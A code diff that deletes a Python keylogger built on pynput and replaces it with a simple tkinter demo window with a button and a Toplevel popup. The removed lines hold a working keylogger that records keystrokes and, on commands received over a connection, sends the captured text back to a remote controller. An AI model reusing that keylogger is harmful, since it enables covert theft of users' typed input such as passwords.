@@ -1,67 +1,38 @@
-from pynput import keyboard
-from functools import partial
+from tkinter import *
 
-# def on_press(key):
-#     try:
-#         print('alphanumeric key {0} pressed'.format(
-#             key.char))
-#     except AttributeError:
-#         print('special key {0} pressed'.format(
-#             key))
 
-# def on_release(key):
-#     print('{0} released'.format(
-#         key))
-#     if key == keyboard.Key.esc:
-#         # Stop listener
-#         return False
+class GUI(Frame):
 
-# # Collect events until released
-# with keyboard.Listener(
-#         on_press=on_press,
-#         on_release=on_release) as listener:
-#     listener.join()
 
-# # ...or, in a non-blocking fashion:
-# listener = keyboard.Listener(
-#     on_press=on_press,
-#     on_release=on_release)
-# listener.start()
-# def activate(name1, name2):
-#     with Listener(on_press=lambda event: on_press(event, left=name1, right=name2)) as listener:
-#         listener.join()
+    def __init__(self, master, *args, **kwargs):
+        Frame.__init__(self, master, *args, **kwargs)
 
-def Keylogger(buff):
-    def on_press(key):
-        nonlocal string
-        try:
-            string += key.char
-        except AttributeError:
-            _key = str(key).split('.')[1].upper()
+        self.master = master
+        self.my_frame = Frame(self.master)
+        self.my_frame.pack()
 
-            if _key == 'ENTER':
-                string += f'[{_key}]\n'
-            elif key == 'SPACE':
-                string += ' '
-            else:
-                string += f'[{_key}]>'
+        self.button1 = Button(self.master, text="Open New Window", command = self.open_toplevel_window)
+        self.button1.pack()
 
-    print('KEYLOGGER FUNCTION')
-    string = ''
-    listener = keyboard.Listener(on_press = on_press)
+        self.text = Text(self.master, width = 20, height = 3)
+        self.text.pack()
+        self.text.insert(END, "Before\ntop window\ninteraction")
 
-    while True:
-        flag = buff.recv_until(DELIM).decode()
-        print(f'\tReceive: {flag}')
-        
-        if flag == 'start':
-            listener.start()
-        elif flag == 'end':
-            listener.stop()
-        elif flag == 'clear':
-            string = ''
-        elif flag == 'send':
-            buff.send(string.encode())
-        elif flag == 'exit':
-            break
+    def open_toplevel_window(self):
+        self.top = Toplevel(self.master)                                                                                            
+        #this forces all focus on the top level until Toplevel is closed
+        self.top.grab_set() 
 
+        def replace_text():
+            self.text.delete(1.0, END)
+            self.text.insert(END, "Text From\nToplevel")
+
+        top_button = Button(self.top, text = "Replace text in main window",
+                            command = replace_text)
+        top_button.pack()
+
+
+if __name__ == "__main__":
+    root = Tk()
+    app = GUI(root)
+    root.mainloop()
